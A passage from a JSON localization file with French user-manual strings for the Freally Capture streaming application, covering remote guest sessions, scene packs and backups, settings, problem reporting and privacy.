explicitement votre réseau.","manual.344e52e3eba1":"Pointez un client Companion ou Stream Deck vers l'adresse affichée. Changez de scène, lancez des transitions, coupez et rétablissez le son, démarrez et arrêtez l'enregistrement, et sauvegardez des replays depuis des boutons matériels.","manual.6664edd9ad4c":"Invités à distance et production d'émission","manual.75ce17238f9b":"Transformez une session avec des invités à distance en véritable émission produite : jusqu'à huit invités, le dessin sur le programme en direct, une salle d'attente, des signaux privés, la connexion de chaque invité en un coup d'œil, et une grille automatique. Tout ce qui suit est désactivé ou sans raccourci par défaut, et rien ne se connecte tant que vous n'invitez personne.","manual.02d9e34002c8":"Sessions à plusieurs invités","manual.5a6c2ec7640d":"Lancez une session avec des invités à distance et partagez le lien d'invitation ou son QR code : <strong>vous plus jusqu'à huit invités</strong>, une galerie de un à neuf. Chaque invité est une vignette avec ses propres commandes de coupure du son, la qualité de sa connexion, un canal de signaux et la mise à l'antenne en un clic.","manual.34a323a45540":"Un invité ouvre le lien dans un navigateur web — rien à installer — et appuie sur <strong>Rejoindre</strong> pour envoyer sa caméra et son microphone. Un invité qui dispose de Freally Capture peut plutôt ouvrir la même invitation dans l'application. Une invitation expire au bout de la durée que vous choisissez.","manual.4e31042e4a6f":"<strong>Remarque :</strong> l'image et le son circulent directement entre vous et chaque invité, de pair à pair et chiffrés pendant le transit ; seule la négociation de la connexion passe par un service de signalisation public. Les sessions sont testées avec quatre invités ; au-delà, cela dépend de votre bande passante et de votre processeur.","manual.33ff43cd0616":"Télestrateur : dessiner sur le programme en direct","manual.d29f651d6eb9":"Ouvrez le <strong>Telestrator</strong> et choisissez un outil — <strong>Stylo</strong>, <strong>Surligneur</strong>, <strong>Flèche</strong> ou <strong>Ellipse</strong> — puis dessinez directement sur le programme. Vos marques font partie de l'image dès que vous les tracez : elles apparaissent donc dans l'enregistrement et le stream, et pas seulement dans votre aperçu.","manual.9aa7fc0273fb":"Laissez les marques s'<strong>Estomper</strong> au bout d'un moment, ou passez en <strong>Mode tableau blanc</strong> pour les <strong>Conserver</strong> jusqu'à ce que vous les effaciez. Le tracé suit la pression d'une tablette, et <strong>Effacer les marques</strong> peut être associé à un raccourci (aucun par défaut).","manual.fc81cd8d37ae":"La salle d'attente","manual.c87beb96ec64":"Activez la <strong>Salle d'attente</strong> : les nouveaux invités patientent hors antenne pendant que vous vérifiez leur caméra et leur microphone dans l'<strong>Aperçu de la salle d'attente</strong>. Lorsqu'ils sont prêts, cliquez sur <strong>Mettre à l'antenne</strong>. L'invité voit un bandeau « vous êtes dans la salle d'attente », dans l'application ou sur la page web.","manual.1d47c8224f50":"Signaux et échanges","manual.569d461035c1":"Envoyez à un invité un <strong>Signal</strong> privé — avec des préréglages tels que <strong>30 secondes</strong>, <strong>Concluez</strong>, <strong>C'est bientôt à vous</strong> et <strong>Parlez plus fort</strong> — par le canal de pair à pair déjà ouvert pour la session. L'invité le voit avec un compte à rebours en direct, jamais dans le programme.","manual.c66c9d5359bf":"Le tableau de bord de la qualité de connexion","manual.4541cc1ee0f5":"Suivez en direct la connexion de chaque invité — temps aller-retour, perte de paquets, résolution et fréquence d'images reçues, et gigue — avec un badge vert, orange ou rouge et un petit graphique d'historique, pour qu'une connexion qui faiblit se voie avant que vos spectateurs ne le remarquent.","manual.bf8e764221e5":"Grilles d'invités automatiques","manual.ffe3c227cdfc":"Activez <strong>Grille auto</strong> pour garder les invités à l'antenne dans une grille ordonnée de un à neuf qui se réorganise d'elle-même lorsque des invités arrivent, partent ou sont mis à l'antenne, ou appuyez sur le bouton d'organisation pour le faire immédiatement. Chaque place publie le nom de son invité dans une variable <code>{{guestN}}</code>, si bien qu'une source de titre devient une plaque nominative qui se met à jour toute seule.","manual.e8630fabd4e5":"Gestion du studio et flux de travail","manual.c8c487196725":"Rendez une disposition complète portable et partageable, conservez des versions nommées de vos scènes, personnalisez le thème de l'application et placez vos actions préférées à portée d'un clic — le tout sur votre ordinateur, sans serveur.","manual.f87995a7cf6c":"Packs de scènes et versions","manual.074bb2bf9453":"Ouvrez la boîte de dialogue de l'espace de travail depuis <strong>Collection de scènes → Gérer les collections de scènes…</strong> : les outils de pack, de comparaison, d'instantané, de sauvegarde et de disposition des docks s'y trouvent tous.","manual.8dce3a052a05":"Cliquez sur <strong>Exporter le pack…</strong> pour regrouper la collection actuelle et ses fichiers (images, médias, LUT, masques, polices) dans un seul <code>.fcappack</code> portable. Les adresses web et les chemins réseau sont listés comme <em>externes</em> plutôt qu'intégrés, et les polices sont signalées pour leurs licences.","manual.c1bba88df9c5":"Cliquez sur <strong>Importer un pack…</strong> et choisissez un <code>.fcappack</code> : il arrive sous forme de nouvelle collection, retrouve ses fichiers sur cet ordinateur, et devient la collection active.","manual.69e7b9f6e8ab":"Cliquez sur <strong>Comparer et fusionner…</strong> pour comparer la collection actuelle avec une autre collection, un pack ou un instantané. Passez en revue les scènes, sources, transformations, filtres et visibilités ajoutés, supprimés et modifiés, puis choisissez exactement les changements à importer. Choisir une scène importe les sources qu'elle utilise.","manual.862a75c84629":"Cliquez sur <strong>Instantanés…</strong>, nommez un point de contrôle et choisissez <strong>Enregistrer l'instantané</strong>. <strong>Restaurer</strong> le rétablit plus tard — votre disposition actuelle est d'abord enregistrée comme instantané, si bien qu'une restauration n'est jamais irréversible. Jusqu'à 50 instantanés sont conservés, avec l'espace disque qu'ils occupent.","manual.8058b1480d14":"<strong>Astuce :</strong> les instantanés sont un historique nommé, en plus de l'enregistrement automatique et de l'annulation. Prenez-en un avant une modification risquée, et vous aurez toujours un point étiqueté auquel revenir.","manual.1d55a62a5fdf":"Sauvegarde, restauration et mode portable","manual.250b89a976de":"Dans la boîte de dialogue de l'espace de travail, cliquez sur <strong>Sauvegarde et restauration…</strong>, puis sur <strong>Exporter la sauvegarde…</strong> pour tout enregistrer — paramètres, profils et collections de scènes — dans un seul fichier <code>.fcapbackup</code>.","manual.560e7e269f11":"Sur un nouvel ordinateur, cliquez sur <strong>Restaurer depuis une sauvegarde…</strong>, cochez ce qu'il faut importer (<strong>Paramètres</strong>, <strong>Collections de scènes</strong>, <strong>Profils</strong>) et choisissez <strong>Restaurer la sélection</strong>. Redémarrez ensuite Freally Capture pour charger les collections et les profils restaurés.","manual.5b26da4b8793":"Pour lancer l'application depuis une clé USB, placez un fichier nommé <code>freally-portable.txt</code> à côté du programme : toutes ses données résident alors dans le dossier du programme au lieu de votre profil utilisateur. <strong>Paramètres → À propos</strong> indique si le mode portable est activé et où se trouvent les données.","manual.a31a49d41d7d":"<strong>Remarque :</strong> les clés de stream et les mots de passe ne sont jamais écrits dans une sauvegarde — saisissez-les de nouveau après la restauration.","manual.5b446c4ea972":"Thèmes, dispositions et actions rapides","manual.8eea476bde73":"Ouvrez <strong>Paramètres → Apparence</strong> et choisissez le thème <strong>Personnalisé</strong> pour modifier la palette, avec des <strong>avertissements de contraste</strong> en direct, puis <strong>Exporter .fctheme…</strong> ou <strong>Importer .fctheme…</strong> pour le partager.","manual.7cc0bc3a4e74":"Dans les <strong>Dispositions des docks</strong> de la boîte de dialogue de l'espace de travail, enregistrez l'agencement actuel sous un nom et cliquez sur une disposition enregistrée pour y basculer.","manual.c9044c09b979":"Dans <strong>Paramètres</strong>, tapez dans <strong>Rechercher dans les paramètres…</strong> pour accéder directement à n'importe quel réglage ; un repère indique les catégories que vous avez modifiées depuis l'ouverture.","manual.a4640858ad4d":"Choisissez <strong>Outils → Actions rapides…</strong> pour ouvrir la grille de boutons. Cliquez sur <strong>Modifier</strong>, puis sur <strong>Ajouter un bouton</strong>, réglez le libellé et la couleur de chaque bouton, et ajoutez des <strong>pages</strong>. Un bouton peut changer de scène, lancer une macro, jouer un pad du soundboard ou exécuter une commande du studio.","manual.74ff6472576d":"<strong>Astuce :</strong> les boutons d'actions rapides exécutent les mêmes commandes du studio que les raccourcis, et la grille est partagée avec le panneau tactile en réseau local : configurez-la une fois, et elle est aussi sur votre téléphone.","manual.74a883a037bc":"Paramètres","manual.5feaf4600834":"Profils, collections de scènes, raccourcis et langue. Tout est gratuit aujourd'hui : il n'y a donc rien à activer. Les <strong>Paramètres</strong> forment une seule fenêtre divisée en catégories — Général, Apparence, Diffusion, Sortie, Replay, Raccourcis, Réseau, Accessibilité et À propos — que l'on ouvre depuis la <strong>barre de menus</strong> (Fichier, Édition, Affichage, Docks, Profil, Collection de scènes, Outils et Aide).","manual.9f6a04e85e39":"<strong>Appliquer, c'est appliquer.</strong> La fenêtre Paramètres modifie une copie : rien ne change tant que vous ne cliquez pas sur <strong>Appliquer</strong> ou <strong>OK</strong>, et <strong>Annuler</strong> rétablit exactement ce que vous aviez, aperçu du thème compris.","manual.3fc0968ef6f9":"<strong>Profils et collections de scènes :</strong> conservez des configurations distinctes — « Diffusion » et « Enregistrement local », par exemple — et passez de l'une à l'autre sans redémarrer, depuis les menus <strong>Profil</strong> et <strong>Collection de scènes</strong>.","manual.ce6f52861bdb":"<strong>Raccourcis :</strong> attribuez chaque action depuis une liste qui exclut les conflits — choisissez un raccourci pour une action et il disparaît de la liste de toutes les autres actions, si bien que deux fonctions ne partagent jamais une touche. <strong>Aucun</strong> le libère de nouveau.","manual.be52349f05be":"<strong>Accessibilité :</strong> choisissez les couleurs des vumètres de la console, y compris un jeu adapté au daltonisme. Toute l'application s'utilise au clavier, et les lecteurs d'écran annoncent le passage en direct, l'enregistrement, la reconnexion et les images perdues.","manual.a79c94673558":"<strong>Langue :</strong> choisissez l'une des 18 langues ; l'application change immédiatement, et l'arabe se lit de droite à gauche.","manual.59274c49ac87":"Signaler un problème","manual.c02ed8aec89d":"C'est vous qui décidez si un problème parvient au développeur, et vous voyez exactement ce qui serait envoyé.","manual.4ed327c34aeb":"Lorsque l'application affiche une erreur qu'elle a elle-même provoquée, un bouton <strong>Signaler</strong> apparaît à côté.","manual.95da4b53fdcc":"Après un plantage, le lancement suivant propose <strong>Signaler</strong> ou <strong>Ignorer</strong>.","manual.6207904599f4":"<strong>Signaler</strong> ouvre dans votre navigateur la page de signalement de Freally Capture sur ce site, avec les informations techniques déjà remplies : vous pouvez les lire, mais pas les modifier. Ajoutez ce que vous étiez en train de faire et, si vous le souhaitez, une adresse e-mail. Rien n'est envoyé tant que vous n'appuyez pas sur <strong>Envoyer</strong> sur cette page.","manual.6acd4e789ccd":"Rien n'est jamais envoyé en arrière-plan, et <strong>Ignorer</strong> n'envoie absolument rien.","manual.69bd78234ffb":"Confidentialité et réseau","manual.42f9b04c2640":"Freally Capture n'a ni compte ni télémétrie, et il n'existe aucun service cloud de notre part. Voici exactement ce qui passe par Internet, et ce qui n'y passe pas.","manual.81fe73d241a8":"<strong>Pas de compte, pas de télémétrie.</strong> L'application ne vous demande jamais de vous connecter et n'envoie jamais nulle part vos scènes, vos enregistrements ni aucune donnée d'utilisation.","manual.3735a28566e9":"<strong>Votre stream va directement à la plateforme.</strong> Il voyage de votre ordinateur vers les services que vous avez configurés — il n'y a aucun serveur relais de notre part.","manual.512b8fa00684":"<strong>Vos enregistrements restent sur votre ordinateur,</strong> dans le dossier que vous choisissez. Rien n'est mis en ligne.","manual.c299fcfa1fde":"<strong>Vos clés de stream restent sur votre ordinateur,</strong> affichées masquées et envoyées uniquement au service vers lequel vous diffusez.","manual.414a08bd0219":"<strong>Les invités à distance se connectent de pair à pair.</strong> Seule la négociation de la connexion de la session passe par un service de signalisation public, et seulement lorsque vous lancez une session.","manual.20c95c4687b3":"<strong>Une incrustation de chat lit le chat public</strong> de la chaîne que vous lui indiquez, comme le ferait un spectateur non connecté — sans compte, sans clé et sans connexion.","manual.efe87d55bed1":"<strong>Deux composants ne sont téléchargés que la première fois que vous en avez besoin :</strong> ffmpeg, pour les codecs qu'exigent les plateformes, et l'environnement d'exécution du navigateur, pour la source navigateur. Chacun provient de son propre éditeur et est vérifié avant utilisation.","manual.3601a272b3b0":"<strong>Une vérification des mises à jour</strong> télécharge un petit fichier une fois par lancement, et lorsque vous choisissez <strong>Vérifier les mises à jour…</strong>. Rien vous concernant, vous ou votre ordinateur, n'est envoyé avec elle, et rien n'est installé sans votre accord.","manual.aa2fa62ecaaf":"<strong>Un rapport de problème n'est envoyé que lorsque vous appuyez sur Envoyer</strong> sur la page de signalement, après avoir lu ce qu'il contient (voir <a href=\"#reporting-a-problem\">Signaler un problème</a>).","manual.804fa6536d40":"<strong>Pas d'IA.</strong> Chaque filtre — suppression du bruit, incrustation chroma, mappage tonal — relève du traitement du signal classique. L'application ne contient aucun modèle d'apprentissage automatique et n'en télécharge aucun."};
